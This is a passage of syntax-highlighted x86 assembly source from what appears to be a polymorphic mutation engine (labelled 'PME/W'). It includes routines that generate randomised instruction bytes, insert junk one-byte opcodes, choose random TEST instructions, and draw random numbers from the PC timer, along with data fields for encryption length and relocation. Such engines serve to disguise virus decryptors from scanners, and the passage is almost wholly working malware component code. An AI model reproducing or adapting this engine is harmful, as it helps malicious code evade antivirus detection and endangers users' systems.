                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">status_byte</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">     
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fix_it1</span><span class="sc0">         </span><span class="sc1">; Needs fix?</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Yeah, it needs :)</span><span class="sc0">
</span><span class="sc5">fix_it1</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">rib_table</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">tons_of_shit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_poly_table</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; Shift 3 bytes left [xx???xxx]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Must be between 0 and 1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; AL must be between 0 and 2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">okay_not_zero</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; Add AH xxxxx111</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">         </span><span class="sc1">; Must be xx???xxx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">finish_him</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">     
</span><span class="sc5">okay_not_zero</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; Shift left 3 bytes</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">         </span><span class="sc1">; Must be xx???xxx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; Add xxxxx111</span><span class="sc0">
</span><span class="sc5">finish_him</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">        </span><span class="sc1">; Add the first 2 bits 11xxxxxx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_func</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">     
</span><span class="sc5">tons_of_shit</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_poly_table</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; Some math operations</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Restore AX</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">           
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; AH = AL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DX = 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FFh</span><span class="sc0"> 
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Divide AX per 1FFh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
</span><span class="sc5">exit_func</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Restore SI</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; Restore DX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Restore CX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Restore AX</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                    </span><span class="sc1">; Return to caller</span><span class="sc0">
</span><span class="sc5">gen_onebyter</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Save SI on stack</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">aam</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">; Interesting instruction this AAM ;)</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; SI = AX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">one_byters</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">get_poly_table</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Save SI</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; Between [00..15]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Multiply per 2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Put in SI</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; only lsb of SI is interesting</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">test_table</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get an offset</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Call the function pointed by it</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Restore SI</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">get_poly_table</span><span class="sc0">  </span><span class="sc1">; Not zero? shit</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Divide per 2</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    

</span><span class="sc1">; All this shitty TESTs =)</span><span class="sc0">

</span><span class="sc5">test_1</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_2</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_4</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_8</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_10</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_20</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_40</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_80</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_11</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_22</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_44</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_88</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">or_al_al</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_200</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_400</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">test_800</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">800h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    

</span><span class="sc1">; The PME/W's RNG (Random Number Generator)</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">; This procedure is for obtain a rand.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; number in AL :)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Timer 8253-5 (AT: 8254.2).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Timer 8253-5 (AT: 8254.2).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Timer 8253-5 (AT: 8254.2).</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; Some data</span><span class="sc0">

</span><span class="sc5">shit</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">status_byte</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">code_offset</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">code_segment</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">work_space</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">work_segment</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">reloc_offset</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">reloc_segment</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">enc_length</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">temp</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">jmp_temp</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">rib_table</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">88h</span><span class="sc0">             </span><span class="sc1">; Table with information needed</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; for RegInfoByte thingy</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc0">

</span><span class="sc1">; Table of do-nothing one-byters, used as garbage</span><span class="sc0">

</span><span class="sc5">one_byters</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FCh</span><span class="sc0">            </span><span class="sc1">; CLD</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FDh</span><span class="sc0">            </span><span class="sc1">; STD</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F3h</span><span class="sc0">            </span><span class="sc1">; REP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F2h</span><span class="sc0">            </span><span class="sc1">; REPNZ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; NOP</span><span class="sc0">

</span><span class="sc1">; Some tables of all TESTs</span><span class="sc0">

</span><span class="sc5">test_table</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_4</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_8</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_10</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_20</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_40</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_80</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_11</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_22</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_44</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_88</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">or_al_al</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_200</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_400</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">test_800</span><span class="sc0">

</span><span class="sc1">; Tables for generate interesting stuff</span><span class="sc0">

</span><span class="sc5">pseudo_table</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_pseudo_rib</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_onebyter</span><span class="sc0">
